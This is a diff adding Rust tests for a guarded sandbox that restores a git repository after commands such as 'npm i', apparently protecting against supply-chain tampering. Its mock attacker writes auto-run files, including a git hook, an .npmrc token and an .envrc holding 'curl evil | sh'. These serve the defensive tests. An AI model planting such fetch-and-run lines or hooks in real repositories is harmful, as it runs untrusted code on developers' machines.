@@ -331,7 +331,13 @@ fn repo() -> PathBuf {
     std::fs::write(dir.join("scripts/build.sh"), "echo build\n").unwrap();
     std::fs::write(dir.join("package.json"), "{}\n").unwrap();
     std::fs::write(dir.join("package-lock.json"), "{}\n").unwrap();
-    std::fs::write(dir.join(".gitignore"), "dist/\nnode_modules/\n").unwrap();
+    std::fs::write(
+        dir.join(".gitignore"),
+        "dist/\nnode_modules/\n.envrc\n.vscode/\n*.log\n",
+    )
+    .unwrap();
+    write(&dir.join("keep.log"), "mine");
+    write(&dir.join("big.bin"), &"x".repeat(2 << 20));
     git(&["add", "-A"]);
     dir.canonicalize().unwrap()
 }
@@ -356,6 +362,14 @@ impl Vm for Hostile {
         write(&r.join("scripts/new.sh"), "evil\n");
         write(&r.join(".git/hooks/post-commit"), "#!/bin/sh\nevil\n");
         write(&r.join(".npmrc"), "//registry:_authToken=x\n");
+        write(&r.join(".envrc"), "curl evil | sh\n");
+        write(&r.join(".vscode/tasks.json"), "evil");
+        write(&r.join(".mise.toml"), "evil");
+        write(&r.join("keep.log"), "tampered");
+        write(&r.join("other.log"), "new ignored");
+        write(&r.join("web/node_modules/x/i.js"), "fine");
+        write(&r.join("build/o.js"), "fine");
+        write(&r.join(".git/info/exclude"), "evil\n");
         let cfg = std::fs::read_to_string(r.join(".git/config")).unwrap();
         write(
             &r.join(".git/config"),
@@ -396,6 +410,14 @@ fn only_node_modules_and_the_manifests_survive_a_call() {
     assert!(!root.join("scripts/new.sh").exists());
     assert!(!root.join(".git/hooks/post-commit").exists());
     assert!(!root.join(".npmrc").exists());
+    assert!(!root.join(".envrc").exists());
+    assert!(!root.join(".vscode/tasks.json").exists());
+    assert!(!root.join(".mise.toml").exists());
+    assert!(!root.join("other.log").exists());
+    assert_eq!(read("keep.log"), "mine");
+    assert!(root.join("web/node_modules/x/i.js").exists());
+    assert!(root.join("build/o.js").exists());
+    assert_ne!(read(".git/info/exclude"), "evil\n");
     assert_eq!(std::fs::read(root.join(".git/config")).unwrap(), cfg_before);
     // Said.
     let said = routed.notes.join("\n");
@@ -426,4 +448,57 @@ fn a_tree_that_is_not_a_git_repository_is_not_routed() {
     assert!(err.contains("snapshot"), "{err}");
     assert!(rec.0.lock().unwrap().is_empty());
     let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// A changed file the snapshot could not hold leads the result as a refusal, not a quiet line.
+#[test]
+fn a_big_changed_file_is_a_loud_refusal_that_leads_the_result() {
+    struct Touch(PathBuf);
+    impl Vm for Touch {
+        fn run(&self, _: &str, _: &str) -> Result<Routed, String> {
+            write(&self.0.join("big.bin"), "small now");
+            Ok(Routed {
+                output: Output {
+                    stdout: b"installed\n".to_vec(),
+                    stderr: Vec::new(),
+                    exit: 0,
+                },
+                notes: Vec::new(),
+            })
+        }
+    }
+    let root = repo();
+    let vm = GuardedVm {
+        inner: Arc::new(Touch(root.clone())),
+        root: root.clone(),
+    };
+    let routed = vm.run("npm i", &root.display().to_string()).unwrap();
+    assert!(
+        routed.notes[0].starts_with("REFUSED-NOT-RESTORED") && routed.notes[0].contains("big.bin"),
+        "{:?}",
+        routed.notes
+    );
+    // Through the tool: ahead of the command's own output.
+    let mut h = crate::testing::routed_harness(route(Arc::new(Fixed(routed.notes.clone()))));
+    let text = h
+        .call("bash", &serde_json::json!({"command": "npm i"}).to_string())
+        .render();
+    let at = text.find("REFUSED-NOT-RESTORED").expect(&text);
+    assert!(at < text.find("installed").expect(&text), "{text}");
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+struct Fixed(Vec<String>);
+
+impl Vm for Fixed {
+    fn run(&self, _: &str, _: &str) -> Result<Routed, String> {
+        Ok(Routed {
+            output: Output {
+                stdout: b"installed\n".to_vec(),
+                stderr: Vec::new(),
+                exit: 0,
+            },
+            notes: self.0.clone(),
+        })
+    }
 }
